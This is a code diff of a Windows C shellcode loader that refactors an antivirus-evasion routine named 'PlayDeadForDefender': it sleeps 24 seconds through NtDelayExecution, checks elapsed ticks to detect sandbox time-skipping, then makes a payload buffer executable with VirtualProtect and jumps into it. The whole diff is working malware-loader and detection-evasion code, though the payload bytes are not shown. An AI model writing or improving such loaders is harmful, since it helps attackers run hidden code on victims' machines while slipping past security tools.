@@ -21,40 +21,55 @@ typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
 	PLARGE_INTEGER       DelayInterval
 );
 
-void main() {
-	DWORD dwOldProtect;
-        char* payload_fnc = NULL;
 
-        //TODO: add random sleep
+int PlayDeadForDefender()
+{
 
-        DWORD               dwMilliSeconds        = 24000;
+    DWORD               dwMilliSeconds        = 24000;
 	LARGE_INTEGER       DelayInterval         = { 0 };
 	__int64            Delay                 = NULL;
-        NTSTATUS            STATUS                = NULL;
+    NTSTATUS            STATUS                = NULL;
         DWORD               _T0                   = NULL, 
         _T1                   = NULL;
         
-        Delay = dwMilliSeconds * 10000;
+    Delay = dwMilliSeconds * 10000;
 	DelayInterval.QuadPart = - Delay;
 
-        fnNtDelayExecution fncNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary("ntdll.dll"), "NtDelayExecution");
-        payload_fnc = bPayload;
-        VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+    fnNtDelayExecution fncNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary("ntdll.dll"), "NtDelayExecution");
 
-        _T0 = GetTickCount();
+    _T0 = GetTickCount();
 
-        STATUS = fncNtDelayExecution(FALSE, &DelayInterval);
-        if (STATUS != 0) {
-            return;
-            }
+    STATUS = fncNtDelayExecution(FALSE, &DelayInterval);
+    if (STATUS != 0) {
+        return 0;
+        }
 
-            _T1 = GetTickCount();
+    _T1 = GetTickCount();
 
-            if (_T1 - _T0 < dwMilliSeconds) {
-                return;
-            }
+    if (_T1 - _T0 < dwMilliSeconds) {
+        return 0;
+    }
 
-	(*(void (*)()) payload_fnc)();
+    return 1;
+}
+
+void main() {
+	DWORD dwOldProtect;
+    char* payload_fnc = NULL;
+
+    //TODO: add random sleep
+
+    payload_fnc = bPayload;
+    VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+
+    if(!PlayDeadForDefender())
+    {
+        return ;
+    }
+	
+    (*(void (*)()) payload_fnc)();
+
+
 	return;
 }
 
